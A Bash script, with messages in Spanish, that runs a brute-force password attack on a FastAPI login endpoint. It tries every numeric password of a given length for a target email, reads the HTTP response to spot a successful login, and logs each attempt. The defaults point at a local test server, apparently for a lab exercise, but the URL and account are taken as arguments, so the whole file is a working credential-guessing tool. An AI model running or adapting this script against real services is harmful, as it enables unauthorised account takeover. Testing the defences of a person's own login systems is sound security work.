#!/bin/bash
set -u

URL="${1:-http://127.0.0.1:8000/login}"
USER="${2:-nicolas@gmail.com}"
PASSWORD_LENGTH="${3:-4}"
LOGFILE="attack_log.txt"
MAX_POSSIBLE=$((10**PASSWORD_LENGTH))

echo "=== Ataque de Fuerza Bruta a la API FastAPI ===" > "$LOGFILE"
echo "Objetivo: $URL" | tee -a "$LOGFILE"
echo "Email objetivo: $USER" | tee -a "$LOGFILE"
echo "Longitud de contraseñas: $PASSWORD_LENGTH dígitos" | tee -a "$LOGFILE"
echo "Total combinaciones posibles: $MAX_POSSIBLE" | tee -a "$LOGFILE"
echo "Inicio: $(date)" | tee -a "$LOGFILE"

attempts=0
start_time=$(date +%s)
found_pw=""
successful_login=false

generate_and_try() {
    local length=$1
    local max=$((10**length - 1))
    
    for i in $(seq -w 0 $max); do
        pw=$(printf "%0${length}d" $i)
        ((attempts++))
        
        if [[ $((attempts % 100)) -eq 0 ]]; then
            echo "Progreso: $attempts/$MAX_POSSIBLE intentos..." | tee -a "$LOGFILE"
        fi
        
        json_data=$(printf '{"email":"%s","password":"%s"}' "$USER" "$pw")
        
        resp_and_code=$(curl -s -S -m 5 -X POST "$URL" \
            -H "Content-Type: application/json" \
            -d "$json_data" \
            -w "||%{http_code}" 2>/dev/null) || {
            echo "ERROR en request" | tee -a "$LOGFILE"
            continue
        }
        
        http_code="${resp_and_code##*||}"
        body="${resp_and_code%||*}"
        
        echo "Intento #$attempts: $pw -> HTTP $http_code" >> "$LOGFILE"
        
        if [[ "$http_code" == "200" ]] && [[ "$body" == *"Login fue un exito"* ]]; then
            found_pw="$pw"
            elapsed=$(( $(date +%s) - start_time ))
            echo ">>> ¡CONTRASEÑA ENCONTRADA! $found_pw (intentos=$attempts, tiempo=${elapsed}s)" | tee -a "$LOGFILE"
            echo "Respuesta completa: $body" | tee -a "$LOGFILE"
            successful_login=true
            return 0
        fi
        
        sleep 0.1
    done
    return 1
}

generate_and_try "$PASSWORD_LENGTH"

total_time=$(( $(date +%s) - start_time ))

if [[ "$successful_login" == true ]]; then
    echo "Resultado: Login exitoso con contraseña: $found_pw" | tee -a "$LOGFILE"
else
    echo "Resultado: Contraseña no encontrada (intentos=$attempts)" | tee -a "$LOGFILE"
fi

echo "Tiempo total: ${total_time}s" | tee -a "$LOGFILE"
echo "Fin: $(date)" | tee -a "$LOGFILE"
echo "Log guardado en: $LOGFILE"

if [[ "$successful_login" == true ]]; then
    echo "¡ÉXITO! Contraseña encontrada: $found_pw"
    echo "Revisa $LOGFILE para más detalles"
else
    echo "No se encontró la contraseña."
fi
